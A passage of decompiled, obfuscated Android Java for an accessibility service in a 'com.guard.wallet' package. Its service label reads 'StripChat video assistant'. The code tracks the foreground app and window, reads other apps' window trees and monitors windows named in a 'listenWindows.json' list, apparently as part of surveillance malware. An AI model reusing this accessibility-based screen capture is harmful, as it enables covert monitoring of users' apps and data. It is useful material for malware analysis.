            var2 = Z((AccessibilityNodeInfo)var4.get());
         } catch (Exception var7) {
            var10000 = var7;
            boolean var24 = false;
            break label98;
         }

         var1 = var2;
         if (!var2) {
            try {
               var1 = K((AccessibilityNodeInfo)var4.get());
            } catch (Exception var6) {
               var10000 = var6;
               boolean var25 = false;
               break label98;
            }
         }

         if (var1) {
            try {
               ((AccessibilityNodeInfo)var4.get()).refresh();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var26 = false;
               break label98;
            }
         }

         return;
      } else {
         label103: {
            if (!var2) {
               return;
            }

            try {
               if (var4.get() == null) {
                  return;
               }

               if (VERSION.SDK_INT >= 33) {
                  this.clearCachedSubtree((AccessibilityNodeInfo)var4.get());
               }
            } catch (Exception var15) {
               var10000 = var15;
               boolean var27 = false;
               break label103;
            }

            try {
               var2 = Z((AccessibilityNodeInfo)var4.get());
            } catch (Exception var14) {
               var10000 = var14;
               boolean var28 = false;
               break label103;
            }

            var1 = var2;
            if (!var2) {
               try {
                  var1 = K((AccessibilityNodeInfo)var4.get());
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var29 = false;
                  break label103;
               }
            }

            if (!var1) {
               return;
            }

            try {
               ((AccessibilityNodeInfo)var4.get()).refresh();
               return;
            } catch (Exception var12) {
               var10000 = var12;
               boolean var30 = false;
            }
         }
      }

      Exception var20 = var10000;
      a1.q.s("clearCacheRoot:", var20);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final UiObject J() {
      Exception var10000;
      label28: {
         AccessibilityNodeInfo var1;
         try {
            var1 = this.findFocus(1);
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label28;
         }

         if (var1 != null) {
            try {
               return UiObject.createRoot(var1);
            } catch (Exception var2) {
               var10000 = var2;
               boolean var7 = false;
            }
         } else {
            try {
               AtomicReference var6 = s;
               if (var6.get() != null) {
                  return ((UiObject)var6.get()).currentFocusedNode();
               }

               return null;
            } catch (Exception var3) {
               var10000 = var3;
               boolean var8 = false;
            }
         }
      }

      Exception var5 = var10000;
      a1.q.s("MyAccessibilityService", var5);
      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final RootInActiveWindowResult R() {
      AccessibilityNodeInfo var18;
      label125: {
         AccessibilityNodeInfo var1;
         Exception var2;
         label128: {
            try {
               var18 = super.getRootInActiveWindow();
            } catch (Exception var16) {
               var2 = var16;
               var1 = null;
               break label128;
            }

            Exception var10000;
            label129: {
               AccessibilityNodeInfo var17 = var18;
               if (var18 != null) {
                  var1 = var18;

                  try {
                     var17 = m0(var18);
                  } catch (Exception var15) {
                     var10000 = var15;
                     boolean var10001 = false;
                     break label129;
                  }
               }

               var1 = var17;

               List var4;
               try {
                  var4 = this.getWindows();
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var22 = false;
                  break label129;
               }

               var18 = var17;
               if (var4 == null) {
                  break label125;
               }

               var1 = var17;
               var18 = var17;

               try {
                  if (var4.isEmpty()) {
                     break label125;
                  }
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var23 = false;
                  break label129;
               }

               var1 = var17;

               try {
                  var21 = var4.iterator();
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var24 = false;
                  break label129;
               }

               while (true) {
                  var1 = var17;
                  var18 = var17;

                  try {
                     if (!var21.hasNext()) {
                        break label125;
                     }
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var25 = false;
                     break;
                  }

                  var1 = var17;

                  try {
                     var19 = (AccessibilityWindowInfo)var21.next();
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var26 = false;
                     break;
                  }

                  if (var19 != null) {
                     var1 = var17;

                     try {
                        if (!var19.isActive()) {
                           continue;
                        }
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var27 = false;
                        break;
                     }

                     if (var17 == null) {
                        var1 = var17;

                        label131: {
                           label132: {
                              try {
                                 if (VERSION.SDK_INT < 33) {
                                    break label132;
                                 }
                              } catch (Exception var11) {
                                 var10000 = var11;
                                 boolean var28 = false;
                                 break;
                              }

                              var1 = var17;

                              try {
                                 var18 = a0.g.a(var19);
                                 break label131;
                              } catch (Exception var7) {
                                 var10000 = var7;
                                 boolean var29 = false;
                                 break;
                              }
                           }

                           var1 = var17;

                           try {
                              var18 = var19.getRoot();
                           } catch (Exception var6) {
                              var10000 = var6;
                              boolean var30 = false;
                              break;
                           }
                        }

                        var17 = var18;
                        if (var18 != null) {
                           var1 = var18;

                           try {
                              var17 = m0(var18);
                           } catch (Exception var5) {
                              var10000 = var5;
                              boolean var31 = false;
                              break;
                           }
                        }
                     }
                  }
               }
            }

            var2 = var10000;
         }

         a1.q.s("MyAccessibilityService", var2);
         var18 = var1;
      }

      if (var18 == null) {
         Log.d("MyAccessibilityService", "curRoot is Null");
      }

      return new RootInActiveWindowResult(var18, false);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final String S() {
      Exception var10000;
      label29: {
         AccessibilityNodeInfo var1;
         try {
            var1 = this.getRootInActiveWindow();
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label29;
         }

         if (var1 != null) {
            try {
               if (var1.getPackageName() != null) {
                  return var1.getPackageName().toString();
               }
            } catch (Exception var3) {
               var10000 = var3;
               boolean var6 = false;
               break label29;
            }
         }

         try {
            return (String)u.get();
         } catch (Exception var2) {
            var10000 = var2;
            boolean var7 = false;
         }
      }

      Exception var5 = var10000;
      a1.q.s("MyAccessibilityService", var5);
      return null;
   }

   public final String T() {
      List var1 = this.getWindows();
      if (var1 != null && !var1.isEmpty()) {
         for (AccessibilityWindowInfo var3 : var1) {
            if (var3 != null && var3.isActive() && var3.getTitle() != null) {
               return var3.getTitle().toString();
            }
         }
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean U(AccessibilityEvent var1) {
      if (var1 != null) {
         Exception var10000;
         label59: {
            try {
               if (var1.getEventType() <= 0) {
                  return false;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label59;
            }

            String var2;
            label48: {
               try {
                  if (var1.getEventType() != 32 || com.guard.wallet.utils.g.p0() || com.guard.wallet.utils.h.q()) {
                     return false;
                  }

                  var2 = this.T();
                  Integer var6 = com.guard.wallet.utils.d.a;
                  if (MainApplication.getInstance() != null
                     && MainApplication.getInstance().getBuildConfig() != null
                     && !a1.q.B(MainApplication.getInstance().getBuildConfig().getAccessibilityServiceLabel())) {
                     var7 = MainApplication.getInstance().getBuildConfig().getAccessibilityServiceLabel();
                     break label48;
                  }
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var9 = false;
                  break label59;
               }

               var7 = "StripChat video assistant";
            }

            try {
               if (Objects.equals(var2, var7)) {
                  Log.d("MyAccessibilityService", "back");
                  com.guard.wallet.utils.g.F0(1);
                  return true;
               }

               return false;
            } catch (Exception var3) {
               var10000 = var3;
               boolean var10 = false;
            }
         }

         Exception var8 = var10000;
         a1.q.s("MyAccessibilityService", var8);
      }

      return false;
   }

   public final boolean V() {
      boolean var1;
      if (this.k.get() >= 2) {
         var1 = true;
      } else {
         var1 = false;
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean W(AccessibilityEvent var1) {
      if (var1 != null) {
         Exception var10000;
         label93: {
            try {
               if (var1.getEventType() <= 0) {
                  return true;
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var10001 = false;
               break label93;
            }

            String var3;
            label72: {
               try {
                  if (var1.getPackageName() != null) {
                     var3 = var1.getPackageName().toString();
                     break label72;
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var12 = false;
                  break label93;
               }

               try {
                  var3 = (String)u.get();
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var13 = false;
                  break label93;
               }
            }

            try {
               if (a1.q.B(var3)) {
                  return true;
               }
            } catch (Exception var6) {
               var10000 = var6;
               boolean var14 = false;
               break label93;
            }

            try {
               if (Objects.equals(var3, this.getPackageName())) {
                  return true;
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var15 = false;
               break label93;
            }

            try {
               if (Objects.equals(var3, "com.google.guard")) {
                  return true;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var16 = false;
               break label93;
            }

            boolean var2;
            try {
               if (!Objects.equals(var1.getEventType(), 2048)) {
                  return false;
               }

               var2 = this.k(var3);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var17 = false;
               break label93;
            }

            if (!var2) {
               return true;
            }

            return false;
         }

         Exception var11 = var10000;
         a1.q.s("isIgnoreEvent", var11);
         return false;
      } else {
         return true;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean X(AccessibilityEvent var1) {
      if (var1 != null) {
         Exception var10000;
         label90: {
            try {
               if (var1.getEventType() <= 0) {
                  return true;
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var10001 = false;
               break label90;
            }

            String var3;
            label69: {
               try {
                  if (var1.getPackageName() != null) {
                     var3 = var1.getPackageName().toString();
                     break label69;
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var11 = false;
                  break label90;
               }

               var3 = null;
            }

            try {
               if (a1.q.B(var3)) {
                  return true;
               }
            } catch (Exception var6) {
               var10000 = var6;
               boolean var12 = false;
               break label90;
            }

            try {
               if (Objects.equals(var3, this.getPackageName())) {
                  return true;
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var13 = false;
               break label90;
            }

            try {
               if (Objects.equals(var1.getEventType(), 64)) {
                  return true;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var14 = false;
               break label90;
            }

            boolean var2;
            try {
               if (!Objects.equals(var1.getEventType(), 2048)) {
                  return false;
               }

               var2 = this.k(var3);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var15 = false;
               break label90;
            }

            if (!var2) {
               return true;
            }

            return false;
         }

         Exception var10 = var10000;
         a1.q.s("MyAccessibilityService", var10);
         return false;
      } else {
         return true;
      }
   }

   public final boolean Y() {
      a var2 = this.m;
      boolean var1;
      if (var2 != null && var2.b.get()) {
         var1 = true;
      } else {
         var1 = false;
      }

      return var1;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void b0(AccessibilityEvent var1) {
      Exception var10000;
      label89: {
         label88: {
            com.guard.wallet.bridge.a var3;
            try {
               if (Integer.valueOf(com.guard.wallet.server.c.G().y.size()) > 0) {
                  break label88;
               }

               var3 = a1.q.d;
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label89;
            }

            boolean var2;
            label76: {
               label75: {
                  if (var3 != null) {
                     try {
                        if (var3.w.get()) {
                           break label75;
                        }
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var13 = false;
                        break label89;
                     }
                  }

                  var2 = false;
                  break label76;
               }

               var2 = true;
            }

            if (!var2) {
               return;
            }
         }

         if (var1 == null) {
            return;
         }

         try {
            if (var1.getEventType() <= 0) {
               return;
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var14 = false;
            break label89;
         }

         String var12;
         label66: {
            try {
               if (var1.getPackageName() != null) {
                  var12 = var1.getPackageName().toString();
                  break label66;
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var15 = false;
               break label89;
            }

            try {
               var12 = (String)u.get();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var16 = false;
               break label89;
            }
         }

         try {
            if (a1.q.B(var12)) {
               return;
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var17 = false;
            break label89;
         }

         try {
            if (Objects.equals(var1.getEventType(), 2048)) {
               super.e.a();
            }

            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var18 = false;
         }
      }

      Exception var11 = var10000;
      a1.q.s("liveBroadcastEvent", var11);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void c0(AccessibilityEvent var1) {
      if (var1 != null) {
         Exception var10000;
         label138: {
            try {
               if (!c0.b(var1.getEventType()) && !c0.a(var1.getEventType())) {
                  return;
               }
            } catch (Exception var16) {
               var10000 = var16;
               boolean var10001 = false;
               break label138;
            }

            try {
               if (Integer.valueOf(com.guard.wallet.server.c.G().z.size()) <= 0 && !a1.q.z()) {
                  return;
               }
            } catch (Exception var15) {
               var10000 = var15;
               boolean var26 = false;
               break label138;
            }

            String var3;
            label126: {
               try {
                  if (var1.getPackageName() != null) {
                     var3 = var1.getPackageName().toString();
                     break label126;
                  }
               } catch (Exception var18) {
                  var10000 = var18;
                  boolean var27 = false;
                  break label138;
               }

               var3 = null;
            }

            try {
               if (Objects.equals(var3, this.getPackageName())) {
                  return;
               }
            } catch (Exception var17) {
               var10000 = var17;
               boolean var28 = false;
               break label138;
            }

            boolean var2;
            try {
               var2 = c0.b(var1.getEventType());
            } catch (Exception var14) {
               var10000 = var14;
               boolean var29 = false;
               break label138;
            }

            c0 var24 = super.f;
            label106:
            if (var2) {
               try {
                  var24.getClass();
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var30 = false;
                  break label106;
               }

               try {
                  if (!var24.b.get()) {
                     ExecutorService var4 = var24.a;
                     o.a var20 = new o.a(var24, 4);
                     var4.submit(var20);
                  }
               } catch (Exception var7) {
                  Exception var19 = var7;

                  try {
                     a1.q.s("o.c0", var19);
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var31 = false;
                     break label106;
                  }
               }

               return;
            } else {
               label139: {
                  label103: {
                     try {
                        if (!c0.a(var1.getEventType())) {
                           return;
                        }

                        if (VERSION.SDK_INT >= 30) {
                           a.a.v();
                           var1 = a0.h.i(var1);
                           break label103;
                        }
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var32 = false;
                        break label139;
                     }

                     try {
                        var1 = AccessibilityEvent.obtain(var1);
                     } catch (Exception var12) {
                        var10000 = var12;
                        boolean var33 = false;
                        break label139;
                     }
                  }

                  try {
                     var24.getClass();
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var34 = false;
                     break label139;
                  }

                  try {
                     if (a1.q.E(7912) && !var24.c.get()) {
                        ExecutorService var5 = var24.a;
                        b0 var25 = new b0(var24, var1, 0);
                        var5.submit(var25);
                     }

                     return;
                  } catch (Exception var10) {
                     Exception var22 = var10;

                     try {
                        a1.q.s("o.c0", var22);
                        return;
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var35 = false;
                     }
                  }
               }
            }
         }

         Exception var23 = var10000;
         a1.q.s("MyAccessibilityService", var23);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final int d0() {
      byte var5 = 0;
      byte var3 = 0;

      Exception var14;
      int var23;
      label75: {
         Exception var17;
         label74: {
            label80: {
               try {
                  var23 = this.k.get();
               } catch (Exception var12) {
                  var17 = var12;
                  boolean var10001 = false;
                  break label80;
               }

               byte var4 = 1;
               boolean var2;
               if (var23 >= 1) {
                  var2 = true;
               } else {
                  var2 = false;
               }

               if (var2) {
                  return var5;
               }

               byte var13 = var5;

               try {
                  if (!com.guard.wallet.utils.h.s()) {
                     return var13;
                  }

                  var6 = com.guard.wallet.utils.g.i0();
               } catch (Exception var11) {
                  var17 = var11;
                  boolean var18 = false;
                  break label80;
               }

               var13 = var5;

               label81: {
                  try {
                     if (a1.q.B(var6)) {
                        return var13;
                     }

                     String var15 = var6.concat("/").concat("listenWindows.json");
                     Log.d("MyAccessibilityService", var15);
                     String var16 = a1.q.K(var15);
                     StringBuilder var7 = new StringBuilder("准备添加本地监听窗口:");
                     var7.append(var16);
                     Log.d("MyAccessibilityService", var7.toString());
                     if (a1.q.B(var16) || com.guard.wallet.utils.g.G(var16) <= 0) {
                        break label81;
                     }

                     Log.d("MyAccessibilityService", "已添加本地监听窗口");
                  } catch (Exception var10) {
                     var17 = var10;
                     boolean var19 = false;
                     break label80;
                  }

                  var23 = 2;

                  try {
                     this.F(2);
                     return 2;
                  } catch (Exception var9) {
                     var17 = var9;
                     boolean var20 = false;
                     break label74;
                  }
               }

               var23 = var4;

               try {
                  this.F(1);
                  return 1;
               } catch (Exception var8) {
                  var17 = var8;
                  boolean var21 = false;
                  break label74;
               }
            }

            var14 = var17;
            var23 = var3;
            break label75;
         }

         var14 = var17;
      }

      a1.q.s("MyAccessibilityService", var14);
      return var23;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void f0(AccessibilityEvent var1) {
      Exception var10000;
      label81: {
         try {
            if (this.n.get()) {
               return;
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var10001 = false;
            break label81;
         }

         boolean var2;
         try {
            var2 = this.W(var1);
         } catch (Exception var9) {
            var10000 = var9;
            boolean var13 = false;
            break label81;
         }

         if (var2) {
            return;
         }

         ConcurrentLinkedQueue var3 = super.a;

         label69: {
            Iterator var4;
            try {
               if (var3.isEmpty()) {
                  break label69;
               }

               var4 = var3.iterator();
            } catch (Exception var8) {
               var10000 = var8;
               boolean var14 = false;
               break label81;
            }

            while (true) {
               try {
                  if (!var4.hasNext()) {
                     break;
                  }

                  var12 = (o.e)var4.next();
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var15 = false;
                  break label81;
               }

               if (var12 != null) {
                  try {
                     if (var12.o() && var12.l() != null && !var12.l().isEmpty() && var12.l().contains(var1.getEventType())) {
                        var12.u(var1, (String)u.get(), (String)v.get());
                     }
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var16 = false;
                     break label81;
                  }
               }
            }
         }

         try {
            this.g0(var1);
            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var17 = false;
         }
      }

      Exception var11 = var10000;
      a1.q.s("noticeAccessibilityEvent", var11);
   }

   public final void g0(AccessibilityEvent var1) {
      g0 var4 = super.g;

      try {
         if (var4.o() && var4.S()) {
            AtomicReference var3 = u;
            String var2 = (String)var3.get();
            AtomicReference var5 = v;
            if (var4.c(var2, (String)var5.get()) && var4.l() != null && !var4.l().isEmpty() && var4.l().contains(var1.getEventType())) {
               var4.u(var1, (String)var3.get(), (String)var5.get());
            }
         }
      } catch (Exception var6) {
         a1.q.s("MyAccessibilityService", var6);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean h0(String var1, String var2, String var3, boolean var4) {
      boolean var5 = false;
      boolean var6 = false;
      ConcurrentLinkedQueue var7 = super.a;

      label73: {
         try {
            if (var7.isEmpty()) {
               return var5;
            }

            var15 = var7.iterator();
         } catch (Exception var13) {
            var14 = var13;
            var5 = var6;
            break label73;
         }

         var5 = false;

         Exception var10000;
         while (true) {
            o.e var8;
            try {
               if (!var15.hasNext()) {
                  return var5;
               }

               var8 = (o.e)var15.next();
            } catch (Exception var12) {
               var10000 = var12;
               boolean var10001 = false;
               break;
            }

            if (var8 != null) {
               label75: {
                  try {
                     if (var8.c(var1, var2)) {
                        if (!Objects.equals(Boolean.TRUE, var8.o())) {
                           var8.w(true);
                        }
                        break label75;
                     }
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var16 = false;
                     break;
                  }

                  try {
                     if (!Objects.equals(Boolean.FALSE, var8.o())) {
                        var8.w(false);
                     }
                     continue;
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var17 = false;
                     break;
                  }
               }

               try {
                  var8.v((UiObject)s.get(), var4, var1, var2, var3);
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var18 = false;
                  break;
               }

               var5 = true;
            }
         }

         var14 = var10000;
      }

      a1.q.s("noticeRootChanged", var14);
      return var5;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean i0(String var1, String var2, String var3, boolean var4) {
      g0 var6 = super.g;
      boolean var5 = false;

      Exception var10000;
      label52: {
         try {
            if (var6.c(var1, var2)) {
               var6.w(true);
               super.g.v((UiObject)s.get(), var4, var1, var2, var3);
               return true;
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var10001 = false;
            break label52;
         }

         try {
            var6.V(var1, var2);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var12 = false;
            break label52;
         }

         var4 = var5;

         try {
            if (Objects.equals(Boolean.FALSE, var6.o())) {
               return var4;
            }

            var6.w(false);
         } catch (Exception var7) {
            var10000 = var7;
            boolean var13 = false;
            break label52;
         }

         return var5;
      }

      Exception var10 = var10000;
      a1.q.s("MyAccessibilityService", var10);
      return var5;
   }

   public final void j0() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: getstatic com/guard/wallet/service/MyAccessibilityService.r Ljava/util/concurrent/atomic/AtomicBoolean;
      // 03: bipush 0
      // 04: invokevirtual java/util/concurrent/atomic/AtomicBoolean.set (Z)V
      // 07: new java/util/concurrent/ThreadPoolExecutor
      // 0a: astore 2
      // 0b: getstatic java/util/concurrent/TimeUnit.MILLISECONDS Ljava/util/concurrent/TimeUnit;
      // 0e: astore 3
      // 0f: new java/util/concurrent/SynchronousQueue
      // 12: astore 1
      // 13: aload 1
      // 14: invokespecial java/util/concurrent/SynchronousQueue.<init> ()V
      // 17: aload 2
      // 18: bipush 0
      // 19: bipush 20
      // 1b: ldc2_w 50
      // 1e: aload 3
      // 1f: aload 1
      // 20: invokespecial java/util/concurrent/ThreadPoolExecutor.<init> (IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V
      // 23: aload 0
      // 24: aload 2
      // 25: putfield com/guard/wallet/service/MyAccessibilityService.o Ljava/util/concurrent/ThreadPoolExecutor;
      // 28: getstatic com/guard/wallet/service/MyAccessibilityService.p Ljava/util/concurrent/atomic/AtomicReference;
      // 2b: aload 0
      // 2c: invokevirtual java/util/concurrent/atomic/AtomicReference.set (Ljava/lang/Object;)V
      // 2f: invokestatic com/guard/wallet/utils/g.p0 ()Z
      // 32: ifne 60
      // 35: invokestatic com/guard/wallet/utils/h.q ()Z
      // 38: ifeq 60
      // 3b: bipush 1
      // 3c: invokestatic com/guard/wallet/utils/g.F0 (I)Z
      // 3f: pop
      // 40: bipush 5
      // 41: invokestatic com/guard/wallet/utils/g.T0 (I)V
      // 44: ldc_w com/guard/wallet/utils/h
      // 47: monitorenter
      // 48: getstatic java/lang/Boolean.FALSE Ljava/lang/Boolean;
      // 4b: ldc_w "isFirstOpenAccessibility"
      // 4e: invokestatic com/guard/wallet/utils/h.D (Ljava/lang/Object;Ljava/lang/String;)Z
      // 51: pop
      // 52: ldc_w com/guard/wallet/utils/h
      // 55: monitorexit
      // 56: goto 60
      // 59: astore 1
      // 5a: ldc_w com/guard/wallet/utils/h
      // 5d: monitorexit
      // 5e: aload 1
      // 5f: athrow
      // 60: aload 0
      // 61: invokevirtual com/guard/wallet/service/MyAccessibilityService.p0 ()V
      // 64: aload 0
      // 65: invokevirtual com/guard/wallet/service/MyAccessibilityService.d0 ()I
      // 68: bipush 2
      // 69: if_icmpgt 70
      // 6c: invokestatic com/guard/wallet/http/l.d ()Z
      // 6f: pop
      // 70: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 73: ifnull 8b
      // 76: invokestatic com/guard/wallet/MainApplication.getInstance ()Lcom/guard/wallet/MainApplication;
      // 79: bipush 32
      // 7b: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
      // 7e: invokevirtual com/guard/wallet/MainApplication.offerAccessibilityEvent (Ljava/lang/Integer;)V
      // 81: goto 8b
      // 84: astore 1
      // 85: ldc "MyAccessibilityService"
      // 87: aload 1
      // 88: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
      // 8b: return
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final ReadScreenWindow k0() {
      String var2 = this.T();

      int var1;
      label72: {
         label71: {
            Exception var10000;
            label76: {
               List var3;
               try {
                  var3 = this.getWindows();
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var10001 = false;
                  break label76;
               }

               if (var3 == null) {
                  break label71;
               }

               Iterator var4;
               try {
                  if (var3.isEmpty()) {
                     break label71;
                  }

                  var4 = var3.iterator();
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var16 = false;
                  break label76;
               }

               while (true) {
                  try {
                     if (!var4.hasNext()) {
                        break label71;
                     }

                     var12 = (AccessibilityWindowInfo)var4.next();
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var17 = false;
                     break;
                  }

                  if (var12 != null) {
                     try {
                        if (var12.isActive()) {
                           var1 = var12.getId();
                           break label72;
                        }
                     } catch (Exception var5) {
                        var10000 = var5;
                        boolean var18 = false;
                        break;
                     }
                  }
               }
            }

            Exception var13 = var10000;
            a1.q.s("MyAccessibilityService", var13);
         }

         var1 = -1;
      }

      ReadScreenWindow var14 = new ReadScreenWindow(var2, var1, (String)u.get(), (String)v.get());
      List var9 = this.getWindows();
      if (var9 != null && !var9.isEmpty()) {
         for (AccessibilityWindowInfo var10 : var9) {
            if (var10 != null) {
               AccessibilityNodeInfo var11;
               if (VERSION.SDK_INT >= 33) {
                  var11 = a0.g.a(var10);
               } else {
                  var11 = var10.getRoot();
               }

               if (var11 != null) {
                  e0(m0(var11), 0, 0, var14);
               }
            }
         }
      }

      return var14;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final NoticeRootChangedVO l0(boolean var1) {
      AtomicReference var6 = v;
      AtomicReference var7 = u;
      AtomicReference var8 = s;

      Exception var10000;
      label155: {
         RootInActiveWindowResult var9;
         AccessibilityNodeInfo var10;
         try {
            var9 = this.R();
            var10 = var9.getCurRoot();
         } catch (Exception var29) {
            var10000 = var29;
            boolean var10001 = false;
            break label155;
         }

         if (var10 == null) {
            return new NoticeRootChangedVO((UiObject)var8.get(), (String)var7.get(), (String)var6.get());
         }

         CharSequence var4;
         try {
            var4 = var10.getPackageName();
         } catch (Exception var28) {
            var10000 = var28;
            boolean var40 = false;
            break label155;
         }

         String var5 = null;
         String var32;
         if (var4 != null) {
            try {
               var32 = var10.getPackageName().toString();
            } catch (Exception var27) {
               var10000 = var27;
               boolean var41 = false;
               break label155;
            }
         } else {
            var32 = null;
         }

         try {
            if (var10.getClassName() != null) {
               var5 = var10.getClassName().toString();
            }
         } catch (Exception var26) {
            var10000 = var26;
            boolean var42 = false;
            break label155;
         }

         AtomicReference var11;
         try {
            var11 = t;
            if (!var10.equals(var11.get())) {
               Log.d("MyAccessibilityService", "当前视图根节点已变化");
            }
         } catch (Exception var25) {
            var10000 = var25;
            boolean var43 = false;
            break label155;
         }

         UiObject var13;
         try {
            var13 = UiObject.createRoot(var10);
            if (var7.get() != null) {
               StringBuilder var12 = new StringBuilder("上一个运行包名 old activePackageName:");
               var12.append((String)var7.get());
               Log.d("MyAccessibilityService", var12.toString());
            }
         } catch (Exception var24) {
            var10000 = var24;
            boolean var44 = false;
            break label155;
         }

         try {
            if (var6.get() != null) {
               StringBuilder var37 = new StringBuilder("上一个运行窗口 old activeWindowClassName:");
               var37.append(var6);
               Log.d("MyAccessibilityService", var37.toString());
            }
         } catch (Exception var23) {
            var10000 = var23;
            boolean var45 = false;
            break label155;
         }

         try {
            if (!a1.q.B(var5)) {
               StringBuilder var38 = new StringBuilder("当前视图栈顶节点:");
               var38.append(var5);
               Log.d("MyAccessibilityService", var38.toString());
            }
         } catch (Exception var22) {
            var10000 = var22;
            boolean var46 = false;
            break label155;
         }

         boolean var3;
         try {
            var3 = Objects.equals(var7.get(), var32);
         } catch (Exception var21) {
            var10000 = var21;
            boolean var47 = false;
            break label155;
         }

         AtomicReference var39 = w;
         boolean var2 = true;
         if (!var3) {
            try {
               var7.set(var32);
               var6.set(var5);
               var39.set(this.T());
            } catch (Exception var19) {
               var10000 = var19;
               boolean var48 = false;
               break label155;
            }

            var3 = true;
         } else {
            label154: {
               try {
                  var2 = this.l(com.guard.wallet.utils.g.v0(var32, var5, o.e.class.getName()));
               } catch (Exception var18) {
                  var10000 = var18;
                  boolean var49 = false;
                  break label155;
               }

               label110: {
                  var3 = false;
                  if (var2) {
                     try {
                        if (!Objects.equals(var6.get(), var5)) {
                           var6.set(var5);
                           var39.set(this.T());
                           break label110;
                        }
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var50 = false;
                        break label155;
                     }
                  }

                  var2 = false;
                  break label154;
               }

               var3 = true;
               var2 = false;
            }
         }

         try {
            this.H(var2, var3);
            var11.set(var10);
            var8.set(var13);
         } catch (Exception var17) {
            var10000 = var17;
            boolean var51 = false;
            break label155;
         }

         if (var2) {
            try {
               StringBuilder var33 = new StringBuilder("当前运行包名已变化 new rootPackageName:");
               var33.append((String)var7.get());
               Log.d("MyAccessibilityService", var33.toString());
            } catch (Exception var16) {
               var10000 = var16;
               boolean var52 = false;
               break label155;
            }
         }

         if (var3) {
            try {
               StringBuilder var34 = new StringBuilder("当前运行窗口已变化 new windowClassName:");
               var34.append((String)var6.get());
               Log.d("MyAccessibilityService", var34.toString());
               StringBuilder var35 = new StringBuilder("当前运行窗口已变化 new windowTitle:");
               var35.append((String)var39.get());
               Log.d("MyAccessibilityService", var35.toString());
            } catch (Exception var15) {
               var10000 = var15;
               boolean var53 = false;
               break label155;
            }
         }

         if (!var1) {
            return new NoticeRootChangedVO((UiObject)var8.get(), (String)var7.get(), (String)var6.get());
         }

         try {
            this.h0((String)var7.get(), (String)var6.get(), (String)var39.get(), var9.isComplete());
            return new NoticeRootChangedVO((UiObject)var8.get(), (String)var7.get(), (String)var6.get());
